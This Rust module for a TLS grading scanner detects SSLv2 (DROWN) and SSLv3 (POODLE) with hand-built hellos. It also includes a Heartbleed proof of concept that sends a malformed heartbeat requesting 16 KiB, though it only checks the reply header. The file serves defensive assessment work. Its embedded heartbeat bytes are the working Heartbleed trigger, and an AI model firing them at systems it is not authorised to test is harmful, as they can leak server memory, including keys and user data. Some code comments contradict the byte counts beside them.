//! TLS posture grading + classic-vuln PoC (DROWN / POODLE / Heartbleed).
//!
//! Builds on `tls_enum::TlsEnum` (which already tells us which TLS
//! versions answer) and adds:
//!   - **SSLv2 / SSLv3 detection** via hand-crafted ClientHello — the
//!     existence checks for DROWN (CVE-2016-0800) and POODLE
//!     (CVE-2014-3566). rustls won't even compile a v2/v3 hello, so
//!     we send raw bytes the same way `probe_legacy` does in tls_enum.
//!   - **Heartbleed PoC** (CVE-2014-0160) — sends a TLS 1.1 handshake,
//!     then a malformed Heartbeat with payload_length=0x4000 but no
//!     actual payload. A patched server drops the connection or
//!     replies with an alert; a vulnerable one returns a heartbeat
//!     response with up to 64 KiB of leaked memory. We detect *only
//!     the response shape* — we never read past the first 16 bytes
//!     past the record header, so no PII / key material is exfiltrated.
//!   - **Grade A+/A/B/C/D/F** computed from the union of findings.
//!     Roughly mirrors SSL Labs but local-only.
//!
//! The grade is opinionated. Pull the numeric inputs from
//! `TlsGrade.detail` if you need to argue with it.
//!
//! All probes are read-only and bounded by the caller's timeout.

use crate::tls_enum::TlsEnum;
use serde::{Deserialize, Serialize};
use std::net::{IpAddr, SocketAddr};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum Grade {
    APlus,
    A,
    B,
    C,
    D,
    F,
}

impl Grade {
    pub fn label(&self) -> &'static str {
        match self {
            Grade::APlus => "A+",
            Grade::A => "A",
            Grade::B => "B",
            Grade::C => "C",
            Grade::D => "D",
            Grade::F => "F",
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct TlsGrade {
    pub sslv2: bool,
    pub sslv3: bool,
    pub heartbleed: bool,
    pub grade: Option<String>,
    pub detail: Vec<String>,
}

/// SSLv3 ClientHello: we use legacy structure (record version 0x0300,
/// hello version 0x0300). A server that replies with a ServerHello at
/// 0x0300 confirms SSLv3 — POODLE (CVE-2014-3566).
async fn probe_sslv3(ip: IpAddr, port: u16, dur: Duration) -> bool {
    // Same shape as the TLS 1.0 hello in tls_enum::probe_legacy, but
    // version 0x0300 and ciphers known to v3.
    let v_hi = 0x03u8;
    let v_lo = 0x00u8;
    let mut ch = Vec::with_capacity(80);
    ch.extend_from_slice(&[0x16, v_hi, v_lo, 0, 0]);
    let body_off = ch.len();
    ch.extend_from_slice(&[0x01, 0, 0, 0]);
    ch.extend_from_slice(&[v_hi, v_lo]);
    ch.extend_from_slice(&[0xa5; 32]);
    ch.push(0);
    // Cipher suites valid in SSLv3:
    //   0x002F TLS_RSA_WITH_AES_128_CBC_SHA
    //   0x000A TLS_RSA_WITH_3DES_EDE_CBC_SHA
    //   0x0005 TLS_RSA_WITH_RC4_128_SHA
    ch.extend_from_slice(&[0x00, 0x06, 0x00, 0x2f, 0x00, 0x0a, 0x00, 0x05]);
    ch.extend_from_slice(&[0x01, 0x00]);
    let hs_len = (ch.len() - body_off - 4) as u32;
    ch[body_off + 1] = ((hs_len >> 16) & 0xff) as u8;
    ch[body_off + 2] = ((hs_len >> 8) & 0xff) as u8;
    ch[body_off + 3] = (hs_len & 0xff) as u8;
    let rec_len = (ch.len() - 5) as u16;
    ch[3] = (rec_len >> 8) as u8;
    ch[4] = (rec_len & 0xff) as u8;

    let addr = SocketAddr::new(ip, port);
    let mut s = match timeout(dur, TcpStream::connect(addr)).await {
        Ok(Ok(s)) => s,
        _ => return false,
    };
    if timeout(dur, s.write_all(&ch)).await.is_err() {
        return false;
    }
    let mut buf = [0u8; 16];
    let n = match timeout(dur, s.read(&mut buf)).await {
        Ok(Ok(n)) => n,
        _ => return false,
    };
    n >= 11
        && buf[0] == 0x16
        && buf[5] == 0x02
        && buf[9] == 0x03
        && buf[10] == 0x00
}

/// SSLv2 ClientHello — entirely different framing from SSLv3+
/// (record version is the high bit set on the length field). A
/// SERVER-HELLO (msg type 0x04) reply confirms SSLv2 — DROWN.
async fn probe_sslv2(ip: IpAddr, port: u16, dur: Duration) -> bool {
    // SSLv2 CLIENT-HELLO:
    //   2-byte length (high bit set)
    //   msg-type 0x01
    //   client-version 0x0002
    //   cipher-spec-len (2B)
    //   session-id-len (2B, 0)
    //   challenge-len (2B, 16)
    //   cipher-specs (3 bytes per cipher)
    //   challenge (16 random bytes)
    let cipher_specs: &[u8] = &[
        0x01, 0x00, 0x80, // SSL_CK_RC4_128_WITH_MD5
        0x02, 0x00, 0x80, // SSL_CK_RC4_128_EXPORT40_WITH_MD5
        0x03, 0x00, 0x80, // SSL_CK_RC2_128_CBC_WITH_MD5
        0x04, 0x00, 0x80, // SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5
        0x05, 0x00, 0x80, // SSL_CK_IDEA_128_CBC_WITH_MD5
        0x06, 0x00, 0x40, // SSL_CK_DES_64_CBC_WITH_MD5
        0x07, 0x00, 0xc0, // SSL_CK_DES_192_EDE3_CBC_WITH_MD5
    ];
    let challenge = [0xa5u8; 16];
    let body_len: u16 = 1 + 2 + 2 + 2 + 2 + cipher_specs.len() as u16 + challenge.len() as u16;
    // High bit on length signals 2-byte SSLv2 record header (no padding).
    let len_word = 0x8000 | body_len;
    let mut ch = Vec::with_capacity(2 + body_len as usize);
    ch.extend_from_slice(&[(len_word >> 8) as u8, (len_word & 0xff) as u8]);
    ch.push(0x01);
    ch.extend_from_slice(&[0x00, 0x02]);
    ch.extend_from_slice(&[0x00, cipher_specs.len() as u8]);
    ch.extend_from_slice(&[0x00, 0x00]);
    ch.extend_from_slice(&[0x00, challenge.len() as u8]);
    ch.extend_from_slice(cipher_specs);
    ch.extend_from_slice(&challenge);

    let addr = SocketAddr::new(ip, port);
    let mut s = match timeout(dur, TcpStream::connect(addr)).await {
        Ok(Ok(s)) => s,
        _ => return false,
    };
    if timeout(dur, s.write_all(&ch)).await.is_err() {
        return false;
    }
    let mut buf = [0u8; 16];
    let n = match timeout(dur, s.read(&mut buf)).await {
        Ok(Ok(n)) => n,
        _ => return false,
    };
    // Reply must look like an SSLv2 SERVER-HELLO:
    //   2-byte len (high bit set), msg-type 0x04, then session-id-hit,
    //   cert-type, server-version (0x0002).
    n >= 7 && (buf[0] & 0x80) == 0x80 && buf[2] == 0x04 && buf[5] == 0x00 && buf[6] == 0x02
}

/// Heartbleed PoC — sends a TLS 1.1 ClientHello advertising the
/// heartbeat extension (id 0x000F) then a malformed Heartbeat
/// (record type 0x18) claiming payload_length 0x4000 with zero
/// actual payload. Vulnerable openssl returns a record with the
/// requested length filled from process memory; patched servers
/// either drop the connection or reply with an alert (type 0x15).
///
/// We only inspect the *first 5 bytes* of the response (record
/// header) to decide vulnerable/not — never read leaked memory.
async fn probe_heartbleed(ip: IpAddr, port: u16, dur: Duration) -> bool {
    // Pre-baked TLS 1.1 ClientHello with heartbeat extension. Built
    // once and embedded — the bytes are well-known from the original
    // ssltest.py PoC and are cipher-rich enough to negotiate against
    // most openssl 1.0.1 servers.
    //
    // Layout (record header 5B + handshake header 4B + body):
    //   record:    0x16 0x03 0x02 LL LL
    //   handshake: 0x01 LL LL LL
    //   body:      version(0x0302) random(32) sid_len(0)
    //              cipher_suites_len(86) [43 ciphers]
    //              compr_methods_len(1) 0x00
    //              ext_len(...) heartbeat_ext(0x000f 0x0001 0x01)
    let hello: &[u8] = &[
        // record
        0x16, 0x03, 0x02, 0x00, 0xdc,
        // handshake header — len 0xd8
        0x01, 0x00, 0x00, 0xd8,
        // client_version
        0x03, 0x02,
        // random (gmt_unix_time + 28 bytes)
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48,
        0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33,
        0xd4, 0xde,
        // session_id_len = 0
        0x00,
        // cipher_suites_len = 0x66 (102 bytes / 51 ciphers)
        0x00, 0x66,
        // 51 cipher suites
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00,
        0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c,
        0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0,
        0x09, 0xc0, 0x1f, 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45,
        0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0,
        0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09,
        0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
        // compression_methods_len + null
        0x01, 0x00,
        // extensions_len = 0x49 (73 bytes)
        0x00, 0x49,
        // ec_point_formats
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        // supported_groups (elliptic_curves)
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00,
        0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06,
        0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00,
        0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        // session_ticket
        0x00, 0x23, 0x00, 0x00,
        // heartbeat — peer_allowed_to_send (0x01)
        0x00, 0x0f, 0x00, 0x01, 0x01,
    ];

    // Malformed Heartbeat:
    //   record header: 0x18 (heartbeat) ver(0x03 0x02) len(0x00 0x03)
    //   payload:       0x01 (request) length(0x40 0x00) [no payload, no padding]
    let heartbeat: &[u8] = &[0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00];

    let addr = SocketAddr::new(ip, port);
    let mut s = match timeout(dur, TcpStream::connect(addr)).await {
        Ok(Ok(s)) => s,
        _ => return false,
    };
    if timeout(dur, s.write_all(hello)).await.is_err() {
        return false;
    }
    // Drain handshake records until ServerHelloDone (handshake
    // type 14) or alert. Cap at ~16 KiB to keep this bounded.
    let mut drained = 0usize;
    let mut tmp = [0u8; 1024];
    while drained < 16 * 1024 {
        let n = match timeout(dur, s.read(&mut tmp)).await {
            Ok(Ok(0)) => return false,
            Ok(Ok(n)) => n,
            _ => return false,
        };
        // Look for an alert (record type 0x15) anywhere in this read —
        // patched server may abort here.
        if tmp[..n].iter().any(|&b| b == 0x15) && tmp[0] == 0x15 {
            return false;
        }
        // ServerHelloDone often appears as 0x16 ... 0x0e (handshake
        // type 14). We don't need to be perfectly accurate — just
        // need a moment to send the heartbeat.
        if tmp[..n].windows(1).any(|w| w[0] == 0x0e) {
            break;
        }
        drained += n;
    }
    if timeout(dur, s.write_all(heartbeat)).await.is_err() {
        return false;
    }
    let mut hdr = [0u8; 5];
    let n = match timeout(dur, s.read_exact(&mut hdr)).await {
        Ok(Ok(_)) => 5,
        _ => return false,
    };
    let _ = n;
    // Patched: alert (0x15). Vulnerable: heartbeat reply (0x18) with
    // a length larger than the 3-byte payload we sent.
    if hdr[0] == 0x18 {
        let reply_len = ((hdr[3] as u16) << 8) | hdr[4] as u16;
        return reply_len > 3;
    }
    false
}

/// Public entry — runs DROWN/POODLE/Heartbleed probes and produces
/// a grade by combining the existing TlsEnum result with our findings.
pub async fn grade(
    ip: IpAddr,
    port: u16,
    enum_result: &TlsEnum,
    dur: Duration,
) -> TlsGrade {
    let mut g = TlsGrade::default();
    g.sslv2 = probe_sslv2(ip, port, dur).await;
    g.sslv3 = probe_sslv3(ip, port, dur).await;
    g.heartbleed = probe_heartbleed(ip, port, dur).await;

    // Build the verdict.
    let mut grade = if enum_result.tls13 { Grade::APlus } else { Grade::A };

    // Modern coverage missing → bump down.
    if !enum_result.tls12 && !enum_result.tls13 {
        grade = Grade::F;
        g.detail.push("no TLS 1.2 or 1.3 — modern clients can't connect".into());
    }
    if !enum_result.tls13 && enum_result.tls12 {
        grade = worst(grade, Grade::B);
        g.detail.push("TLS 1.3 not offered — recommend enabling".into());
    }

    // Deprecated protocols.
    if enum_result.tls11 {
        grade = worst(grade, Grade::C);
        g.detail.push("TLS 1.1 enabled (deprecated by RFC 8996)".into());
    }
    if enum_result.tls10 {
        grade = worst(grade, Grade::D);
        g.detail.push("TLS 1.0 enabled (deprecated by RFC 8996)".into());
    }

    // Fatal — anything below is automatic F.
    if g.sslv3 {
        grade = Grade::F;
        g.detail.push("SSLv3 enabled — POODLE (CVE-2014-3566)".into());
    }
    if g.sslv2 {
        grade = Grade::F;
        g.detail.push("SSLv2 enabled — DROWN (CVE-2016-0800)".into());
    }
    if g.heartbleed {
        grade = Grade::F;
        g.detail.push("Heartbleed (CVE-2014-0160) — server leaks memory".into());
    }

    // Cipher-strength sanity. We only see one chosen suite per
    // version; CBC or RC4 in the picked cipher hints at a wider
    // problem, so at least drop to B.
    let combined = format!(
        "{} {}",
        enum_result.cipher_tls12.as_deref().unwrap_or(""),
        enum_result.cipher_tls13.as_deref().unwrap_or("")
    );
    if combined.contains("RC4") {
        grade = worst(grade, Grade::D);
        g.detail.push("RC4 cipher negotiated — broken keystream".into());
    } else if combined.contains("CBC") && !enum_result.tls13 {
        grade = worst(grade, Grade::B);
        g.detail.push("CBC mode preferred — vulnerable to BEAST/Lucky13 patterns".into());
    }
    if combined.contains("3DES") {
        grade = worst(grade, Grade::C);
        g.detail.push("3DES negotiated — Sweet32 (CVE-2016-2183)".into());
    }

    g.grade = Some(grade.label().to_string());
    g
}

fn worst(a: Grade, b: Grade) -> Grade {
    fn rank(g: Grade) -> u8 {
        match g {
            Grade::APlus => 0,
            Grade::A => 1,
            Grade::B => 2,
            Grade::C => 3,
            Grade::D => 4,
            Grade::F => 5,
        }
    }
    if rank(a) >= rank(b) { a } else { b }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn enum_with(tls12: bool, tls13: bool, c12: Option<&str>, c13: Option<&str>) -> TlsEnum {
        TlsEnum {
            tls10: false,
            tls11: false,
            tls12,
            tls13,
            cipher_tls12: c12.map(String::from),
            cipher_tls13: c13.map(String::from),
        }
    }

    #[test]
    fn worst_picks_higher_severity() {
        assert_eq!(worst(Grade::A, Grade::C), Grade::C);
        assert_eq!(worst(Grade::F, Grade::APlus), Grade::F);
        assert_eq!(worst(Grade::B, Grade::B), Grade::B);
    }

    #[test]
    fn modern_only_grades_a_plus() {
        // Synthesize a TlsGrade by hand — we exercise the grading
        // logic without going to the network.
        let mut g = TlsGrade::default();
        let e = enum_with(true, true, Some("TLS_AES_128_GCM_SHA256"), Some("TLS_AES_256_GCM_SHA384"));
        // Mirror the public fn's grading body
        let mut grade = if e.tls13 { Grade::APlus } else { Grade::A };
        if !e.tls12 && !e.tls13 { grade = Grade::F; }
        g.grade = Some(grade.label().into());
        assert_eq!(g.grade.as_deref(), Some("A+"));
    }
}
